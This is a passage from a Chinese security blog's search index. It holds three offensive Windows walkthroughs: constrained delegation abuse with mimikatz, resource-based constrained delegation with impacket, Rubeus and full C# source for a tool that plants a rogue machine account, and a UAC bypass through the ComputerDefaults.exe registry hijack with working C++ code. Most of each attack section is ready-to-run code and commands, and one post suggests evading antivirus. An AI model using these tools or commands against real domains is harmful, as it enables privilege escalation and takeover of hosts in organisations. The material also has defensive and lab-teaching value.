rel="noopener">TGT_sqlsvr@0DAY.ORG_krbtgt</a>~0day.org@0DAY.ORG.kirbi</p><p>使用这张TGT通过伪造s4u请求以administrator用户身份请求访问Srv-DB-0day CIFS的ST</p><p>tgs::s4u /tgt:<a href="mailto:TGT_sqlsvr@0DAY.ORG_krbtgt" target="_blank" rel="noopener">TGT_sqlsvr@0DAY.ORG_krbtgt</a>~0day.org@0DAY.ORG.kirbi /user:<a href="mailto:Administrator@0day.org" target="_blank" rel="noopener">Administrator@0day.org</a> /service:cifs/Srv-DB-0day.0day.org</p><p>S4U2Self获取到的ST1以及S4U2Proxy获取到的Srv-DB-0day CIFS服务的ST2会保存在当前目录下</p><p><img src="/img/delegation/3856b471-3f77-4497-a05e-d108b3082d2c.png" alt="img"></p><p><img src="/img/delegation/0660e189-5f7a-4c7b-882d-2614b32a8c81.png" alt="img"></p><h3 id="3-获取权限"><a href="#3-获取权限" class="headerlink" title="3. 获取权限"></a>3. 获取权限</h3><p>使用mimikatz将ST2导入当前会话即可，如果有杀软，自行免杀。需要以管理员权限运行mimikatz</p><pre><code>kerberos::ptt TGS_Administrator@0day.org@0DAY.ORG_cifs~Srv-DB-0day.0day.org@0DAY.ORG.kirbidir \\Srv-DB-0day.0day.org\C$\</code></pre><p><img src="/img/delegation/78714f9a-a23b-428c-a1e5-7b1fae22aa80.png" alt="img"></p><h2 id="0x03-视频演示"><a href="#0x03-视频演示" class="headerlink" title="0x03 视频演示"></a>0x03 视频演示</h2><p><img src="/img/delegation/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B.gif" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 域渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 约束委派利用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于资源的约束委派利用</title>
      <link href="/2020/11/25/ji-yu-zi-yuan-de-yue-shu-wei-pai-li-yong/"/>
      <url>/2020/11/25/ji-yu-zi-yuan-de-yue-shu-wei-pai-li-yong/</url>
      
        <content type="html"><![CDATA[<h1 id="0x09-基于资源的约束委派利用"><a href="#0x09-基于资源的约束委派利用" class="headerlink" title="0x09 基于资源的约束委派利用"></a>0x09 基于资源的约束委派利用</h1><h2 id="0x01-应用场景："><a href="#0x01-应用场景：" class="headerlink" title="0x01 应用场景："></a>0x01 应用场景：</h2><p>​    在大型内网域环境中，将机器加入到域环境中一般不会用域管权限，而是用一个专门加域的域用户去操作。那么当我们拿下该域用户的账号密码时，就可以把通过该域用户加入到域里的所有机器都拿下。</p><p>0.限制：只能在windows 2012及以上版本的域控才可以，因为08及以下的域控没有msDS-AllowedToActOnBehalfOfOtherIdentity这个属性</p><p><img src="/img/delegation/70ffc507-8f02-4621-8811-a8050fd47030.png" alt="img"></p><p><img src="/img/delegation/507dd4fe-2571-40b6-9d6b-9cb0cd441e2c.png" alt="img"></p><p>\1. 提权：当我们钓鱼拿下一台员工机器，发现是在域里面的，然后在电脑里发现addUser域用户的账号密码，因为需要addUser域用户将员工机器加入到域环境里，所以有可能会获得到addUser的账号密码。然后发现当前域用户并不在本地管理组里，就可以通过addUser域用户提权到adminsitrator。</p><p>\2. 横向拓展：在hack域中，addUser域用户负责将员工lm的机器或者web服务器web2008等机器加入到hack域里，那么当我们拿下addUser这个域用户的权限后，就可以拿下员工lm的机器和web服务器web2008。</p><p>环境模拟</p><pre><code>hack域角色            IP                    主机名                     服务器类型dc:         192.168.52.2        windows_server_2016_dc          windows2016web:        192.168.52.8        web2008                         windows2008pc:         192.168.52.30       win7-pc                         windows07domain user：    addUser     P@ssw0rd        加域账号</code></pre><p>web2008 和 win7-pc 是由addUser域用户(addUser不是域管)加入到域环境里成为域机器，但是addUser并不是web2008|win7-pc 域机器的本地管理组成员。</p><p>win7-pc域机器的信息：模拟内网里的员工电脑</p><ol><li><p>当前用户是lm域用户，但是lm域用户不是本地管理员成员。</p></li><li><p>由addUser域用户加入到域里，但是addUser域用户不是win7-pc域机器的本地管理组</p></li></ol><p><img src="/img/delegation/4c1cf92d-d0e9-4934-af7b-aa8f4c941342.png" alt="img"></p><p>web2008域机器的信息：模拟内网的web服务</p><ol><li>由addUser域用户加入到域里，但是addUser域用户不是web2008域机器的本地管理组</li></ol><p><img src="/img/delegation/8cc84979-fbf5-458b-9cc0-c44e97ffb712.png" alt="img"></p><h2 id="0x02-利用："><a href="#0x02-利用：" class="headerlink" title="0x02 利用："></a>0x02 利用：</h2><p>只要获取到加域账号就可以。</p><h3 id="0x02-1-寻找加域账号"><a href="#0x02-1-寻找加域账号" class="headerlink" title="0x02-1 寻找加域账号"></a>0x02-1 寻找加域账号</h3><pre><code>查询ACL：powerview的脚本，IdentityReference：域用户，ObjectDN：域机器，ActiveDirectoryRights：权限Get-ObjectAcl -ADSprefix &quot;CN=Computers&quot; |select IdentityReference,ObjectDN,ActiveDirectoryRights查询每个域机器是由哪个域用户添加进域的,通过mS-DS-CreatorSID查看域用户的sidAdFind.exe -h 192.168.52.2 -u lm -up Lm123*** -b &quot;DC=hack,DC=local&quot; -f &quot;objectClass=computer&quot; mS-DS-CreatorSID</code></pre><p><img src="/img/delegation/ba988274-ed8f-45ea-8e55-d4de3ea3b57c.png" alt="img"></p><p><img src="/img/delegation/e08d6cb2-30b6-4932-a1cc-11148660d453.png" alt="img"></p><pre><code>dn:CN=WEB2008,CN=Computers,DC=hack,DC=local&gt;mS-DS-CreatorSID: S-1-5-21-675002476-827761145-2127888524-1619sid2user.exe \\192.168.52.2 5 21 675002476 827761145 2127888524 1619Name is addUserDomain is HACKType of SID is SidTypeUser</code></pre><p>查WEB2008是由哪个域用户加入到域机器里的</p><p><img src="/img/delegation/068eed09-8d37-4579-a047-ed583f6b3fe1.png" alt="img"></p><p>此时找到了域里的加域账号addUser</p><h3 id="0x02-2-横向拓展"><a href="#0x02-2-横向拓展" class="headerlink" title="0x02-2 横向拓展"></a>0x02-2 横向拓展</h3><p>假设拿到了addUser用户，尝试和web2008建立ipc连接，发现并没有权限。</p><p><img src="/img/delegation/a90d3bbb-4568-48e7-9b43-9c4b27124437.png" alt="img"></p><p>使用addUser域用户添加一个域机器账户evilpc，机器账户的密码是123456，并且对web2008域机器配置msDS-AllowedToActOnBehalfOfOtherIdentity属性</p><pre><code>Addnew_MachineAccount.exe 域控IP 域的名字 域用户名 域用户密码 目标机器Addnew_MachineAccount.exe 192.168.52.2 hack.local addUser P@ssw0rd web2008</code></pre><p><img src="/img/delegation/ad8a188f-a8c5-414d-bdcf-ed3d42d46200.png" alt="img"></p><p><img src="/img/delegation/145fd8f2-7e80-4000-91ae-9f46e968c36f.png" alt="img"></p><p><img src="/img/delegation/99473ef7-2795-4101-8d78-8d7c458d88ae.png" alt="img"></p><p>使用impacket的getST生成票据，会在当前目录下生成administrator.ccache文件</p><p>目标机器安装impacket有点不现实，所以可以使用socks代理生成票据</p><pre><code>getST.py -dc-ip 192.168.52.2 hack.local/evilpc\$:123456 -spn cifs/web2008.hack.local -impersonate administrator</code></pre><p><img src="/img/delegation/8da00ed8-598a-44f7-bac1-01c95f402f10.png" alt="img"></p><p>使用mimikatz导入票据</p><pre><code>kerberos::ptc 票据kerberos::ptc C:\Users\lm\Desktop\administrator.ccache</code></pre><p><img src="/img/delegation/27454634-c24c-4ea5-86ca-62cc6ee44625.png" alt="img"></p><pre><code>klist           查询票据klist purge     清空票据</code></pre><p><img src="/img/delegation/568c02c8-3a1d-4953-8cfe-a8c769bd3eee.png" alt="img"></p><p>成功获取权限，切记，这里一定要是web2008.hack.local，只是web2008是没有权限的</p><p><img src="/img/delegation/7e7145a8-9dd9-4f01-9561-f663ba59835f.png" alt="img"></p><p>删除票据后，就没有权限了</p><p><img src="/img/delegation/2d9bf118-abaa-4b8d-9881-f820f96b5d2b.png" alt="img"></p><p>或者可以尝试用Rubeus生成票据，但是本地失败了。</p><p>计算域机器evilpc$的hash</p><pre><code>Rubeus.exe hash /user:evilpc$ /password:123456 /domain:hack.local</code></pre><p><img src="/img/delegation/f80b6fdf-3128-407b-b2f7-7df3ccf91c70.png" alt="img"></p><pre><code>Rubeus.exe s4u /user:evilpc$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:administrator /msdsspn:cifs/web2008 /pttRubeus.exe s4u /user:evilpc$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:administrator /msdsspn:host/web2008 /ptt</code></pre><p><img src="/img/delegation/15ab3eb5-a043-41af-9973-aad8dc74be25.png" alt="img"></p><p><img src="/img/delegation/667b5baa-1fe6-44f1-a3c9-b631c6c193c9.png" alt="img"></p><h2 id="0x03-参考链接"><a href="#0x03-参考链接" class="headerlink" title="0x03 参考链接"></a>0x03 参考链接</h2><pre><code>https://mp.weixin.qq.com/s/Ue2ULu8vxYHrYEalEzbBSwhttps://xz.aliyun.com/t/7454#toc-1https://xz.aliyun.com/t/7217#toc-0https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-AdminSDHolder/  查询aclhttps://www.cnblogs.com/simon7s/p/12370183.htm  mimikatz导入ccache票据</code></pre><h2 id="0x04-Addnew-MachineAccount-源码"><a href="#0x04-Addnew-MachineAccount-源码" class="headerlink" title="0x04 Addnew_MachineAccount 源码"></a>0x04 Addnew_MachineAccount 源码</h2><p>Addnew_MachineAccount.exe源码，使用C#编译</p><p><img src="/img/delegation/9e65d224-9857-4dd9-8d0a-787b96e3c5c1.png" alt="img"></p><p>添加对activedirecty操作的dll的引用</p><p><img src="/img/delegation/7b03aad5-a2d9-4619-8a80-412624cad08a.png" alt="img"></p><p>第十九行需要改一下，将DC=hack,DC=local改为内网对应的域</p><pre><code>using System;using System.Text;using System.Security.AccessControl;using System.Security.Principal;using System.Net;namespace Addnew_MachineAccount{    class Program    {        static void Main(string[] args)        {            String DomainController = args[0];  // 域控IP            String Domain = args[1];   // hack.local            String username = args[2]; //域用户名            String password = args[3]; //域用户密码            String victimcomputer = args[4]; //需要进行提权的机器            String new_MachineAccount = &quot;evilpc&quot;; //添加的机器账户            String new_MachineAccount_password = &quot;123456&quot;; //机器账户密码            String victimcomputer_ldap_path = &quot;LDAP://CN=&quot; + victimcomputer + &quot;, CN=Computers,DC=hack,DC=local&quot;; // 这里也需要改            String machine_account = new_MachineAccount;            String sam_account = machine_account + &quot;$&quot;;            String distinguished_name = &quot;&quot;;            String[] DC_array = null;            distinguished_name = &quot;CN=&quot; + machine_account + &quot;,CN=Computers&quot;;            DC_array = Domain.Split(&#39;.&#39;);            foreach (String DC in DC_array)            {                distinguished_name += &quot;,DC=&quot; + DC;            }            Console.WriteLine(&quot;[+] Elevate permissions on &quot; + victimcomputer);            Console.WriteLine(&quot;[+] Domain = &quot; + Domain);            Console.WriteLine(&quot;[+] Domain Controller = &quot; + DomainController);            //Console.WriteLine(&quot;[+] New SAMAccountName = &quot; + sam_account);            //Console.WriteLine(&quot;[+] Distinguished Name = &quot; + distinguished_name);            //连接ldap            System.DirectoryServices.Protocols.LdapDirectoryIdentifier identifier = new System.DirectoryServices.Protocols.LdapDirectoryIdentifier(DomainController, 389);            NetworkCredential nc = new NetworkCredential(username, password); //使用凭据登录            System.DirectoryServices.Protocols.LdapConnection connection = null;            connection = new System.DirectoryServices.Protocols.LdapConnection(identifier, nc);            //connection = new System.DirectoryServices.Protocols.LdapConnection(identifier);            connection.SessionOptions.Sealing = true;            connection.SessionOptions.Signing = true;            connection.Bind();            var request = new System.DirectoryServices.Protocols.AddRequest(distinguished_name, new System.DirectoryServices.Protocols.DirectoryAttribute[] {                new System.DirectoryServices.Protocols.DirectoryAttribute(&quot;DnsHostName&quot;, machine_account +&quot;.&quot;+ Domain),                new System.DirectoryServices.Protocols.DirectoryAttribute(&quot;SamAccountName&quot;, sam_account),                new System.DirectoryServices.Protocols.DirectoryAttribute(&quot;userAccountControl&quot;, &quot;4096&quot;),                new System.DirectoryServices.Protocols.DirectoryAttribute(&quot;unicodePwd&quot;, Encoding.Unicode.GetBytes(&quot;\&quot;&quot; + new_MachineAccount_password + &quot;\&quot;&quot;)),                new System.DirectoryServices.Protocols.DirectoryAttribute(&quot;objectClass&quot;, &quot;Computer&quot;),                new System.DirectoryServices.Protocols.DirectoryAttribute(&quot;ServicePrincipalName&quot;, &quot;HOST/&quot;+machine_account+&quot;.&quot;+Domain,&quot;RestrictedKrbHost/&quot;+machine_account+&quot;.&quot;+Domain,&quot;HOST/&quot;+machine_account,&quot;RestrictedKrbHost/&quot;+machine_account)            });            try            {                //添加机器账户                connection.SendRequest(request);                Console.WriteLine(&quot;[+] Machine account: &quot; + machine_account + &quot; Password: &quot; + new_MachineAccount_password + &quot; added&quot;);            }            catch (System.Exception ex)            {                Console.WriteLine(&quot;[-] The new machine could not be created! User may have reached ms-DS-new_MachineAccountQuota limit.)&quot;);                Console.WriteLine(&quot;[-] Exception: &quot; + ex.Message);                return;            }            // 获取新计算机对象的SID            var new_request = new System.DirectoryServices.Protocols.SearchRequest(distinguished_name, &quot;(&amp;(samAccountType=805306369)(|(name=&quot; + machine_account + &quot;)))&quot;, System.DirectoryServices.Protocols.SearchScope.Subtree, null);            var new_response = (System.DirectoryServices.Protocols.SearchResponse)connection.SendRequest(new_request);            SecurityIdentifier sid = null;            foreach (System.DirectoryServices.Protocols.SearchResultEntry entry in new_response.Entries)            {                try                {                    sid = new SecurityIdentifier(entry.Attributes[&quot;objectsid&quot;][0] as byte[], 0);                    Console.Out.WriteLine(&quot;[+] &quot; + new_MachineAccount + &quot; SID : &quot; + sid.Value);                }                catch                {                    Console.WriteLine(&quot;[!] It was not possible to retrieve the SID.\nExiting...&quot;);                    return;                }            }            //设置资源约束委派            //System.DirectoryServices.DirectoryEntry myldapConnection = new System.DirectoryServices.DirectoryEntry(&quot;domain.com.cn&quot;);            System.DirectoryServices.DirectoryEntry myldapConnection = new System.DirectoryServices.DirectoryEntry(Domain, username, password);            myldapConnection.Path = victimcomputer_ldap_path;            myldapConnection.AuthenticationType = System.DirectoryServices.AuthenticationTypes.Secure;            System.DirectoryServices.DirectorySearcher search = new System.DirectoryServices.DirectorySearcher(myldapConnection);            //通过ldap找计算机            search.Filter = &quot;(CN=&quot; + victimcomputer + &quot;)&quot;;            string[] requiredProperties = new string[] { &quot;samaccountname&quot; };            foreach (String property in requiredProperties)                search.PropertiesToLoad.Add(property);            System.DirectoryServices.SearchResult result = null;            try            {                result = search.FindOne();            }            catch (System.Exception ex)            {                Console.WriteLine(ex.Message + &quot;Exiting...&quot;);                return;            }            if (result != null)            {                System.DirectoryServices.DirectoryEntry entryToUpdate = result.GetDirectoryEntry();                String sec_descriptor = &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;&quot; + sid.Value + &quot;)&quot;;                System.Security.AccessControl.RawSecurityDescriptor sd = new RawSecurityDescriptor(sec_descriptor);                byte[] descriptor_buffer = new byte[sd.BinaryLength];                sd.GetBinaryForm(descriptor_buffer, 0);                // 添加evilpc的sid到msds-allowedtoactonbehalfofotheridentity中                entryToUpdate.Properties[&quot;msds-allowedtoactonbehalfofotheridentity&quot;].Value = descriptor_buffer;                try                {                    entryToUpdate.CommitChanges();//提交更改                    Console.WriteLine(&quot;[+] Exploit successfully!&quot;);                }                catch (System.Exception ex)                {                    Console.WriteLine(ex.Message);                    Console.WriteLine(&quot;[!] \nFailed...&quot;);                    return;                }            }        }    }}</code></pre><h2 id="0x05-视频演示"><a href="#0x05-视频演示" class="headerlink" title="0x05 视频演示"></a>0x05 视频演示</h2><p><img src="/img/delegation/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8.gif" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 域渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基于资源的约束委派利用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于白名单注册表bypassUAC</title>
      <link href="/2020/11/25/regeditbypassuac/"/>
      <url>/2020/11/25/regeditbypassuac/</url>
      
        <content type="html"><![CDATA[<h1 id="基于白名单注册表bypassUAC"><a href="#基于白名单注册表bypassUAC" class="headerlink" title="基于白名单注册表bypassUAC"></a>基于白名单注册表bypassUAC</h1><h2 id="0x01-概念"><a href="#0x01-概念" class="headerlink" title="0x01 概念"></a>0x01 概念</h2><p>用户帐户控制（User Account Control，简写作UAC)是微软公司在其Windows Vista及更高版本操作系统中采用的一种控制机制。其原理是通知用户是否对应用程序使用硬盘驱动器和系统文件授权，以达到帮助阻止恶意程序（有时也称为“恶意软件”）损坏系统的效果。</p><p>当前用户是管理员权限，但是有些exe会弹出用户账户控制，如果点击否的话，就会出现拒绝访问，那么也就没有成功运行该程序了。这样就会影响后续的内网渗透，例如取密码等，所以我们需要bypassuac。</p><p><img src="/img/regeditBypassUAC/1.jpg" alt></p><p><img src="/img/regeditBypassUAC/2.jpg" alt></p><p>手动bypassuac，右键以管理员身份运行，但是显然这个是不现实的</p><p><img src="/img/regeditBypassUAC/3.jpg" alt></p><h2 id="0x02-发掘bypassUAC的程序"><a href="#0x02-发掘bypassUAC的程序" class="headerlink" title="0x02 发掘bypassUAC的程序"></a>0x02 发掘bypassUAC的程序</h2><p>有一些系统程序是会直接获取管理员权限同时不弹出UAC弹窗，这类程序被称为白名单程序。 这些程序拥有autoElevate属性的值为True，会在启动时就静默提升权限。</p><pre><code>1. 程序的manifest标识的配置属性 autoElevate为true2. 程序不弹出UAC弹窗3. 从注册表里查询Shell\Open\command键值对</code></pre><h3 id="0x02-1-寻找autoElevate为true的程序"><a href="#0x02-1-寻找autoElevate为true的程序" class="headerlink" title="0x02-1 寻找autoElevate为true的程序"></a>0x02-1 寻找autoElevate为true的程序</h3><p><img src="/img/regeditBypassUAC/4.jpg" alt></p><p>这里写了个py脚本遍历c:\windows\system32\目录下的所有exe文件，寻找autoElevate为true的exe程序</p><pre><code>import osfrom subprocess import *# path = r&#39;C:\Users\bingdu\Desktop\bypassUAC&#39;path = &#39;c:\windows\system32&#39;files = os.listdir(path)print(files)def GetFileList(path, fileList):    newDir = path    if os.path.isfile(path):        if path[-4:] == &#39;.exe&#39;:            fileList.append(path)    elif os.path.isdir(path):        try:            for s in os.listdir(path):                newDir=os.path.join(path,s)                GetFileList(newDir, fileList)        except Exception as e:            pass    return fileListfiles = GetFileList(path, [])      print(files)for eachFile in files:    if eachFile[-4:] == &#39;.exe&#39;:        command = r&#39;.\sigcheck64.exe -m {} | findstr auto&#39;.format(eachFile)        print(command)        p1 = Popen(command, shell=True, stdin=PIPE, stdout=PIPE)        if &#39;&lt;autoElevate&gt;true&lt;/autoElevate&gt;&#39; in p1.stdout.read().decode(&#39;gb2312&#39;):            copy_command = r&#39;copy {} .\success&#39;.format(eachFile)            Popen(copy_command, shell=True, stdin=PIPE, stdout=PIPE)            print(&#39;[+] {}&#39;.format(eachFile))            with open(&#39;success.txt&#39;, &#39;at&#39;) as f:                f.writelines(&#39;{}\n&#39;.format(eachFile))</code></pre><p><img src="/img/regeditBypassUAC/5.jpg" alt></p><p>结果如下：</p><pre><code>c:\windows\system32\bthudtask.exec:\windows\system32\changepk.exec:\windows\system32\ComputerDefaults.exec:\windows\system32\dccw.exec:\windows\system32\dcomcnfg.exec:\windows\system32\DeviceEject.exec:\windows\system32\DeviceProperties.exec:\windows\system32\djoin.exec:\windows\system32\easinvoker.exec:\windows\system32\EASPolicyManagerBrokerHost.exec:\windows\system32\eudcedit.exec:\windows\system32\eventvwr.exec:\windows\system32\fodhelper.exec:\windows\system32\fsquirt.exec:\windows\system32\FXSUNATD.exec:\windows\system32\immersivetpmvscmgrsvr.exec:\windows\system32\iscsicli.exec:\windows\system32\iscsicpl.exec:\windows\system32\lpksetup.exec:\windows\system32\MSchedExe.exec:\windows\system32\msconfig.exec:\windows\system32\msra.exec:\windows\system32\MultiDigiMon.exec:\windows\system32\newdev.exec:\windows\system32\odbcad32.exec:\windows\system32\PasswordOnWakeSettingFlyout.exec:\windows\system32\pwcreator.exec:\windows\system32\rdpshell.exec:\windows\system32\recdisc.exec:\windows\system32\rrinstaller.exec:\windows\system32\shrpubw.exec:\windows\system32\slui.exec:\windows\system32\Sysprep\sysprep.exec:\windows\system32\SystemPropertiesAdvanced.exec:\windows\system32\SystemPropertiesComputerName.exec:\windows\system32\SystemPropertiesDataExecutionPrevention.exec:\windows\system32\SystemPropertiesHardware.exec:\windows\system32\SystemPropertiesPerformance.exec:\windows\system32\SystemPropertiesProtection.exec:\windows\system32\SystemPropertiesRemote.exec:\windows\system32\SystemSettingsAdminFlows.exec:\windows\system32\SystemSettingsRemoveDevice.exec:\windows\system32\Taskmgr.exec:\windows\system32\tcmsetup.exec:\windows\system32\TpmInit.exec:\windows\system32\WindowsUpdateElevatedInstaller.exec:\windows\system32\WSReset.exec:\windows\system32\wusa.exe</code></pre><h3 id="0x02-2-寻找不弹UAC框的程序"><a href="#0x02-2-寻找不弹UAC框的程序" class="headerlink" title="0x02-2 寻找不弹UAC框的程序"></a>0x02-2 寻找不弹UAC框的程序</h3><p>在cmd一个个的去运行exe，如果不弹uac框就运行的既是</p><p>结果如下，下面只是找的前面几个，后面的没有去测试</p><pre><code>c:\windows\system32\bthudtask.exe                       okc:\windows\system32\changepk.exec:\windows\system32\ComputerDefaults.exe                ok      1c:\windows\system32\dccw.exe                            ok      1c:\windows\system32\dcomcnfg.exe                        ok      1c:\windows\system32\DeviceEject.exe                     ok  c:\windows\system32\DeviceProperties.exe                okc:\windows\system32\djoin.exe                           okc:\windows\system32\easinvoker.exe                      okc:\windows\system32\EASPolicyManagerBrokerHost.exe      okc:\windows\system32\eudcedit.exe                        ok      1c:\windows\system32\eventvwr.exe                        ok      1c:\windows\system32\fodhelper.exe                       ok      1c:\windows\system32\fsquirt.exe                         ok      1c:\windows\system32\FXSUNATD.exe                        okc:\windows\system32\immersivetpmvscmgrsvr.exe           okc:\windows\system32\iscsicli.exe                        ok      1c:\windows\system32\iscsicpl.exe                        ok      1</code></pre><h3 id="0x02-3-从注册表里查询Shell-Open-command键值对"><a href="#0x02-3-从注册表里查询Shell-Open-command键值对" class="headerlink" title="0x02-3 从注册表里查询Shell\Open\command键值对"></a>0x02-3 从注册表里查询Shell\Open\command键值对</h3><p>通常以shell\open\command命名的键值对存储的是可执行文件的路径，如果exe程序运行的时候找到该键值对，就会运行该键值对的程序，而因为exe运行的时候是静默提升了权限，所以运行的该键值对的程序就已经过了uac。</p><p>所以我们把恶意的exe路径写入该键值对，那么就能够过uac执行我们的恶意exe。</p><p>使用Procmon监听，运行0x02-2的结果</p><p>这里以c:\windows\system32\ComputerDefaults.exe测试</p><p>过滤条件如下</p><p><img src="/img/regeditBypassUAC/6.jpg" alt></p><p>会去查询HKCU:\Software\Classes\ms-settings\shell\open\command</p><p><img src="/img/regeditBypassUAC/7.jpg" alt></p><p>然后我们再注册表里创建该键值对</p><p><img src="/img/regeditBypassUAC/8.jpg" alt><br>继续监听，重新运行c:\windows\system32\ComputerDefaults.exe，发现还查询了HKCU\Software\Classes\ms-settings\shell\open\command\DelegateExecute的键值对</p><p><img src="/img/regeditBypassUAC/9.jpg" alt></p><p>在注册表里创建HKCU\Software\Classes\ms-settings\shell\open\command\DelegateExecute</p><p><img src="/img/regeditBypassUAC/10.jpg" alt></p><p>继续监听，重新运行c:\windows\system32\ComputerDefaults.exe，这时候采取获取Software\Classes\ms-settings\shell\open\command的默认值，然后就会运行该值的程序</p><p><img src="/img/regeditBypassUAC/11.jpg" alt></p><h3 id="0x02-4-总结"><a href="#0x02-4-总结" class="headerlink" title="0x02-4 总结"></a>0x02-4 总结</h3><p>如果键值对HKCU:\Software\Classes\ms-settings\shell\open\command存在，ComputerDefaults会接下去查找HKCU:\Software\Classes\ms-settings\shell\open\command\DelegateExecute是否也存在,若也存在到则读取HKCU:\Software\Classes\ms-settings\shell\open\command的值然后执行。</p><p>测试：将HKCU:\Software\Classes\ms-settings\shell\open\command(default)的值设置为cmd.exe，然后运行c:\windows\system32\ComputerDefaults.exe</p><p><img src="/img/regeditBypassUAC/12.jpg" alt></p><p>成功弹出exe，并且是过了uac的权限</p><p><img src="/img/regeditBypassUAC/13.jpg" alt></p><h2 id="0x03-C-代码实现运行任意exe过uac"><a href="#0x03-C-代码实现运行任意exe过uac" class="headerlink" title="0x03 C++代码实现运行任意exe过uac"></a>0x03 C++代码实现运行任意exe过uac</h2><pre><code>#include &lt;stdio.h&gt;#include &lt;Windows.h&gt;int wmain(int argc, wchar_t* argv[]) {    if (argc != 2) {        wprintf(L&quot;Usage: %s &lt;filePath&gt;\n&quot;, argv[0]);        wprintf(L&quot;       %s cmd.exe\n&quot;, argv[0]);        exit(1);    }    LPWSTR filePath = argv[1];    PROCESS_INFORMATION pi = { 0 };    STARTUPINFOA si = { 0 };    HKEY hKey;    si.cb = sizeof(STARTUPINFO);    si.wShowWindow = SW_HIDE;    RegCreateKeyW(HKEY_CURRENT_USER, L&quot;Software\\Classes\\ms-settings\\Shell\\open\\command&quot;, &amp;hKey);       // 创建注册表项    RegSetValueExW(hKey, L&quot;&quot;, 0, REG_SZ, (LPBYTE)filePath, lstrlenW(filePath));                             // 赋值，执行的exe路径    RegSetValueExW(hKey, L&quot;DelegateExecute&quot;, 0, REG_SZ, (LPBYTE)&quot;&quot;, sizeof(&quot;&quot;));    // 创建进程ComputerDefaults    CreateProcessA(&quot;C:\\Windows\\System32\\cmd.exe&quot;, (LPSTR)&quot;/c C:\\Windows\\System32\\ComputerDefaults.exe&quot;, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &amp;si, &amp;pi);    // 延时十秒，等ComputerDefaults.exe运行    Sleep(10000);    // 清楚注册表项    RegDeleteTreeA(HKEY_CURRENT_USER, &quot;Software\\Classes\\ms-settings&quot;);    return 0;}</code></pre><p>效果：</p><p><img src="/img/regeditBypassUAC/14.jpg" alt></p><h2 id="视频演示"><a href="#视频演示" class="headerlink" title="视频演示"></a>视频演示</h2><p><img src="/img/regeditBypassUAC/regeditBypassUAC.gif" alt></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://idiotc4t.com/privilege-escalation/bypassuac-fodhelper" target="_blank" rel="noopener">https://idiotc4t.com/privilege-escalation/bypassuac-fodhelper</a></p>]]></content>
      
      
      <categories>
          
          <category> BypassUAC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BypassUAC </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
